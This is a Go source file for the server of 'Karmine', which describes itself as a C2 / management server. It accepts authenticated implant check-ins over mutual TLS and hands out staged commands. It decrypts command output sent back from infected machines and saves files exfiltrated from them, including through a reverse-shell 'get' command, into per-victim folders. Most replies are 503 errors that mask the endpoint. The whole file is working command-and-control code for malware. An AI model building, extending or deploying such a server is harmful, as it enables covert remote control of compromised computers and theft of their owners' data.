package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/alecthomas/kingpin"
	"github.com/gorilla/mux"
	"github.com/pygrum/karmine/config"
	"github.com/pygrum/karmine/datastore"
	"github.com/pygrum/karmine/kmdline"
	"github.com/pygrum/karmine/krypto/kes"
	"github.com/pygrum/karmine/models"
	log "github.com/sirupsen/logrus"
)

const (
	asciiTitle = "============================\n" +
		"█▄▀ ▄▀█ █▀█ █▀▄▀█ █ █▄░█ █▀▀\n" +
		"█░█ █▀█ █▀▄ █░▀░█ █ █░▀█ ██▄\n" +
		"============================\n" +
		"v1.0.0 - https://github.com/pygrum/karmine"
)

var (
	db      *datastore.Kdb
	fileMap = make(map[string]string)

	app  = kingpin.New(os.Args[0], "Karmine v1.0.0 - C2 / management server")
	host = app.Arg("host", "address to serve on").Required().String()
	port = app.Arg("port", "port to listen on").Default("443").String()
)

func main() {
	fmt.Print("\033[H\033[2J")
	kingpin.MustParse(app.Parse(os.Args[1:]))
	if net.ParseIP(*host) == nil && *host != "localhost" {
		log.Fatalf("%s is not valid - provide a valid IP address or localhost", *host)
	}
	fileMap["1"] = "/tmp/cmdstage.tmp"
	fileMap["2"] = "/tmp/filestage.tmp"
	conf, err := config.GetFullConfig()
	if err != nil {
		log.Fatal(err)
	}
	certfile, keyfile, err := config.GetSSLPair()
	if err != nil {
		log.Error(err)
	}
	srv, err := newMTLSServer(certfile)
	if err != nil {
		log.Error(err)
	}
	r := mux.NewRouter()
	c, err := config.GetFullConfig()
	if err != nil {
		log.Fatal(err)
	}
	r.Host(c.SslDomain)
	r.HandleFunc(conf.Endpoint, simpleHandler)
	srv.Handler = r
	srv.Addr = *host + ":" + *port
	fmt.Println(asciiTitle)
	fmt.Printf("\n")
	kl, err := kmdline.Kmdline("$ ")
	if err != nil {
		log.Fatal(err)
	}
	db, err = datastore.New()
	if err != nil {
		log.Fatal(err)
	}
	bytes, err := json.Marshal(&models.TmpConf{
		LHost:    *host,
		LPort:    *port,
		Endpoint: conf.Endpoint,
	})
	if err != nil {
		log.Fatal(err)
	}
	if err = os.WriteFile("/tmp/karmine.tmp", bytes, 0644); err != nil {
		log.Fatal(err)
	}
	go func() {
		log.Fatal(srv.ListenAndServeTLS(certfile, keyfile))
	}()
	log.Fatal(kl.Read())
}

func simpleHandler(w http.ResponseWriter, r *http.Request) {
	uuid := r.Header.Get("X-UUID")
	if !db.UUIDExists(uuid) {
		w.WriteHeader(503)
		return
	}
	if r.Method == http.MethodGet {
		handleGet(w, r)
	} else if r.Method == http.MethodPost {
		handlePost(w, r)
	}
}

func handleGet(w http.ResponseWriter, r *http.Request) {
	t := r.URL.Query().Get("t")
	if len(t) == 0 {
		log.Warn("could not find parameter 't' in request")
		w.WriteHeader(503)
		return
	}
	contentFile, ok := fileMap[t]
	if !ok {
		log.Warn("invalid type %d supplied as parameter 't' in request", t)
		w.WriteHeader(503)
		return
	}
	bytes, err := os.ReadFile(contentFile)
	if err != nil {
		w.WriteHeader(503)
		return
	}
	w.Write(bytes)
}

func handlePost(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	body, _ := ioutil.ReadAll(r.Body)
	genericData := &models.GenericData{}
	if err := json.Unmarshal(body, genericData); err != nil {
		log.Error(err)
		w.WriteHeader(503)
		return
	}
	var obj []byte
	var err error
	remoteUUID := r.Header.Get("X-UUID")
	aeskey, x1, x2 := db.GetKeysByUUID(remoteUUID)
	obj, err = kes.DecryptObject(genericData.Object, aeskey, x1, x2)
	if err != nil {
		log.Error(err)
		w.WriteHeader(503)
		return
	}
	switch genericData.Type {
	case 1:
		cmdResponse := &models.KarResponseObjectCmd{}
		if err := json.Unmarshal(obj, &cmdResponse); err != nil {
			log.Error(err)
			w.WriteHeader(503)
			return
		}
		uid := remoteUUID
		cmd := db.GetCmdByID(genericData.CmdID)
		name, err := datastore.GetNameByUUID(uid)
		if err != nil {
			log.Error(err)
		}
		if cmdResponse.Code == 1 {
			if cmdResponse.Data.Error == io.EOF.Error() {
				w.WriteHeader(503)
				return
			}
			log.Error(fmt.Errorf("%s: error executing '%s'", name, cmd))
			log.Error(cmdResponse.Data.Error)
			w.WriteHeader(503)
			return
		}
		logResponse(cmdResponse, cmd, name, uid, r.RemoteAddr)
		if err = db.DeleteCmdByID(genericData.CmdID); err != nil {
			if err.Error() != "no rows affected" {
				log.Errorf("failed to delete command with id %d: %v", genericData.CmdID, err)
				return
			}
		}
	case 2:
		fileObj := &models.KarResponseObjectFile{}
		if err := json.Unmarshal(obj, fileObj); err != nil {
			log.Error(err)
			w.WriteHeader(503)
			return
		}
		if fileObj.Error != 0 {
			n, err := datastore.GetNameByUUID(remoteUUID)
			if err != nil {
				log.Error(err)
			}
			s := fmt.Sprintf("\n%s | %s\n", n, r.RemoteAddr)
			brk := strings.Repeat("-", len(s))
			fmt.Println("\n" + brk)
			fmt.Println(s)
			log.WithField("status", "error").Error(fileObj.ErrVal)
			fmt.Println(brk)
		}
	case 3:
		files := &[]models.KarObjectFile{}
		if err = json.Unmarshal(obj, files); err != nil {
			log.Error(err)
			w.WriteHeader(503)
			return
		}
		name, err := datastore.GetNameByUUID(remoteUUID)
		if err != nil {
			log.Error(err)
			w.WriteHeader(503)
			return
		}
		if err = os.MkdirAll(name, 0644); err != nil {
			log.Error(err)
			w.WriteHeader(503)
			return
		}
		for _, f := range *files {
			wrName := filepath.Base(f.FileName)
			path := filepath.Join(name, wrName)
			if err := os.WriteFile(path, f.FileBytes, 0644); err != nil {
				log.Error(err)
				w.WriteHeader(503)
				return
			}
		}
		var cmd string
		if genericData.CmdID == -1 {
			cmd = "revshell 'get' command"
		} else {
			cmd = db.GetCmdByID(genericData.CmdID)
		}
		s := fmt.Sprintf("\n%s | %s\n", name, r.RemoteAddr)
		brk := strings.Repeat("-", len(s))
		fmt.Println("\n" + brk)
		fmt.Println(s)
		log.WithField("status", "success").Info(cmd)
		log.Infof("Received %d files from %s. Written to %s/ directory", len(*files), name, name)
		fmt.Println("\n" + brk)
	}
	w.WriteHeader(503)
}

func logResponse(resp *models.KarResponseObjectCmd, cmd, name, uid, addr string) {
	if len(cmd) == 0 {
		return
	}
	s := fmt.Sprintf("|| [%s] %s ||", name, strings.Replace(addr, ":", "@", -1))
	brk := strings.Repeat("-", len(s))
	header := strings.Repeat("=", len(s))
	fmt.Println("\n" + header)
	fmt.Println(s)
	fmt.Println(header)
	if resp.Code == 1 {
		log.WithField("status", "error").Info(cmd)
		fmt.Printf("%s", resp.Data.Error)
		fmt.Println(brk)
		return
	}
	log.WithField("status", "success").Info(cmd)
	fmt.Printf("%s", resp.Data.Result)
	fmt.Println(brk)

}

func newMTLSServer(certFile string) (*http.Server, error) {
	caCert, err := ioutil.ReadFile(certFile)
	if err != nil {
		return nil, err
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	tlsConfig := &tls.Config{
		ClientCAs:  caCertPool,
		ClientAuth: tls.RequireAndVerifyClientCert,
	}

	return &http.Server{
		TLSConfig: tlsConfig,
	}, nil
}
